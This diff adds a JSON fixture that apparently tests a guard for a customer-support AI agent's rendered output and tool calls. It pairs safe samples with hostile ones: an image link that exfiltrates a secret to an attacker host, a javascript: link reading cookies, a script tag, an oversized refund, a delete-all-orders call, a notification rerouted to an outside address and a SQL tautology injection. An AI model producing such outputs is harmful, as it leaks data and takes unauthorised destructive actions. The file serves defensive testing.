@@ -1,0 +1,17 @@
+{
+  "render": [
+    "See [refund policy](https://help.northwind.example/refunds).",
+    "Done! ![img](https://collector.attacker.example/p.png?d=SECRET)",
+    "[Reset password](javascript:alert(document.cookie))",
+    "<script>steal()</script> Your order shipped."
+  ],
+  "tool_calls": [
+    "{\"tool\": \"issue_refund\", \"arguments\": {\"order_id\": \"ORD-100001\", \"amount\": 20}}",
+    "{\"tool\": \"issue_refund\", \"arguments\": {\"order_id\": \"ORD-100001\", \"amount\": 5000}}",
+    "{\"tool\": \"delete_all_orders\", \"arguments\": {}}",
+    "{\"tool\": \"set_ticket_status\", \"arguments\": {\"ticket_id\": 7, \"status\": \"resolved\", \"notify\": \"evil@example.net\"}}"
+  ],
+  "sql_injected_where": "customer = 'sam@example.org' OR '1'='1'",
+  "safe_filter": "{\"filters\": [{\"column\": \"status\", \"op\": \"=\", \"value\": \"shipped\"}]}",
+  "forbidden_filter": "{\"filters\": [{\"column\": \"customer\", \"op\": \"=\", \"value\": \"lee@example.org\"}]}"
+}
